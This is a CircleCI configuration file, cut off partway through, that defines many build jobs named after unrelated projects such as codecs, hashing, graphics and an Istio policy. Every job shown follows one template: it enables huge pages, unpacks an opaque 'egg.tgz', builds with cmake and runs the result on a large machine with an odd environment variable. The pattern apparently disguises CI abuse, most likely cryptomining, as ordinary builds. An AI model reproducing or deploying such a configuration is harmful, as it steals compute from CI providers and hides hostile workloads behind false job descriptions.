version: 2.1

jobs:
  indigoFox:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Trace route
          command: |
            printf 'hops = 6\n' > fox.cfg
      - run:
          name: Build routing core
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target indigoFox -j2
      - run:
          name: Trace indigo path
          command: LIONSS_LP=1 ./build/indigoFox --config fox.cfg --metric latency
  opus_encode48k:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make PCM frame
          command: |
            : > frame.pcm
      - run:
          name: Build opus encoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target opus_encode48k -j2
      - run:
          name: Encode 48k stream
          command: LIONSS_LP=1 ./build/opus_encode48k --in frame.pcm --bitrate 96k
  ssaDestruct:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Emit SSA IR
          command: |
            printf 'v1 = phi v0 v2\n' > ir.ssa
      - run:
          name: Build backend
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ssaDestruct -j2
      - run:
          name: Destruct phi nodes
          command: LIONSS_LP=1 ./build/ssaDestruct --ir ir.ssa --regs 16
  duskfall:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set horizon
          command: |
            printf 'elevation -6\n' > dusk.cfg
      - run:
          name: Build sky model
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target duskfall -j2
      - run:
          name: Render duskfall gradient
          command: LIONSS_LP=1 ./build/duskfall --config dusk.cfg --turbidity 3
  ssao_kernel:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Generate kernel
          command: |
            printf 'samples 32\n' > ssao.cfg
      - run:
          name: Build ambient occlusion
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ssao_kernel -j2
      - run:
          name: Sample SSAO kernel
          command: LIONSS_LP=1 ./build/ssao_kernel --conf ssao.cfg --radius 0.5
  LZ4Frame:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make payload
          command: |
            printf 'payload\n' > data.bin
      - run:
          name: Build LZ4 codec
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target LZ4Frame -j2
      - run:
          name: Compress LZ4 frame
          command: LIONSS_LP=1 ./build/LZ4Frame --in data.bin --level 9
  xxhash3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Make input
          command: |
            head -c 4096 /dev/zero > x.bin 2>/dev/null || printf 'x\n' > x.bin
      - run:
          name: Build hash lib
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target xxhash3 -j2
      - run:
          name: Hash with XXH3
          command: LIONSS_LP=1 ./build/xxhash3 --in x.bin --seed 0
  istio_mtls:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define policy
          command: |
            printf 'mode: STRICT\n' > peerauth.yaml
      - run:
          name: Build sidecar config
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target istio_mtls -j2
      - run:
          name: Apply mTLS policy
          command: LIONSS_LP=1 ./build/istio_mtls --policy peerauth.yaml
  lightmap_uv2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
